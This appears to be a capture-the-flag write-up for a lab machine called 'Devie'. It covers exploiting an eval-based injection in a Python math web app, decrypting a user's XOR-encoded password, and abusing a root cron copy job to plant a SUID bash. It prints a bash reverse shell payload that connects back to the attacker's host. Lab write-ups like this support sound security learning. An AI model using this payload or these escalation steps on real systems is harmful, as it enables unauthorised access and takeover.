Devie

Target IP: 10.10.10.188
Challenge Description: Don't always trust what you can't see.

Reconnaissance

Doing an aggressive port scan against the two open TCP ports returns the result above.


Running whatweb against the web application on port 5000 returns the useful information above. The target machine seems to be running the technology Werkzeug/2.1.2 Python/3.8.10.

Enumeration

Port 5000: HTTP

The webpage above is returned for this web application. The developer has created a website to calculate the different math formulas. The source-code of this page does not contain anything useful. In the image above, there is a link to the source-code of the web application? Maybe this contains useful information? I downloaded this on my machine.


I unzipped the file and obtained the contents above. There are two directories and five Python files in total. After some enumeration, I find app.py Python file and templates directory the most interesting.


I notice the function biscect from app.py is using the eval method. I passed invalid inputs and the server returned the Internal Server Error to me. This is perfect as it looks like the input is processed by the target machine. And by the looks of it, I can perform server-side template injection attack against the target machine.


After some Google search, I found the payloads above from this link. Time to exploit the vulnerability.

Exploitation


I started a listener on port 8443 on my machine. From previous enumeration, I know the Bisection Method functionality from this website uses the eval method. Therefore, I passed the number 1 for xa and the reverse shell payload __import__('os').system('bash -c "bash -i >& /dev/tcp/10.14.55.153/8443 0>&1"') for xb. Then I successfully obtained a reverse shell connection on my machine at port 8443, as shown above. Now I have a foothold on the target machine with the session as bruce.

Privilege Escalation


After landing a shell, I notice there is an interesting file called note located at the home directory of user bruce. The content of this file is shown above. The user Gordon has created a Python script to encode a given string using XOR and base64. Using this Python script, the user Gordon has encrypted their password. I will need to reverse engineer the encrypted string above to obtain their password.


I tried to read the content of encrypt.py at /opt/, but this user bruce does not have the permission. However, running sudo -l shows this script can be executed as the user gordon without their password! This script only allows me to encrypt it, as I cannot decrypt it.


Using the tool, I tried to reverse engineer it to obtain the secret key. I created the recipe above in Cyberchef, encypted the test string encryptthispasswordplease using the script.py, passed the encrypted string to Cyberchef, and obtained the secret key supersecretkeyxorxor using the recipe from Cyberchef. Now I have the secret key, I can decrypt the password of user Gordon.


And decrypting the encrypted password NEUEDTIeN1MRDg5K using the same recipe provides G0th@mR0ckz!. Now I have the password of the user Gordon.


Bingo! Now I successfully elevated my privileges from the user bruce to gordon horizontally.


I transferred Linpeas to the target machine and executed it as the user gordon. I obtained the useful information above about the backup file. Is this a cronjob?


The content of the script backup is shown above. I only have read privileges over it.


I transferred pspy64 to the target machine and executed it. It looks like the backup is a cronjob!


I tried to obtain a root shell by exploiting the wildcard used by the copy binary, as shown above. But I had no luck. The bash gets the SUID bit set; however, I am unable to obtain a root access. That is when I learned I had to use --preserve=mode flag.


And after I browsed to the backups directory and used the command ./bash -p to obtain a root shell.
